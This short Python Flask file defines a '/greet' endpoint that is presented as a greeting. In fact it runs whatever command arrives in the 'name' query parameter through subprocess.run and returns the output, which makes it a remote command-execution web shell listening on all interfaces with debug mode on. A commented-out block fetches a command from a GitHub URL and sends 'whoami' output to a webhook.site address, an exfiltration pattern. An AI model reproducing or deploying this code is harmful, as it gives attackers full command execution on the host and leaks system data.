import subprocess




# cmd = requests.get("https://raw.githubusercontent.com/RanushMithila/testas/main/config")
# result = subprocess.run(["whoami"], capture_output=True, text=True)
# print(result.stdout)
# url = "https://webhook.site/d5578720-d15c-4497-860c-ffcb802307c2/?result="+result.stdout+"&print=" + cmd.text
# res = requests.get(url)

from flask import Flask, request

app = Flask(__name__)

@app.route('/greet')
def greet():
    name = request.args.get('name', 'World')  # Default to 'World' if no name is provided
    try:
        name = name.split(" ")
        result = subprocess.run([name[0], name[1]], capture_output=True, text=True)
    except:
        result = subprocess.run([name], capture_output=True, text=True)
    return f'Hello, {result.stdout}!'

if __name__ == '__main__':
    app.run(debug=True, port=8080, host="0.0.0.0")
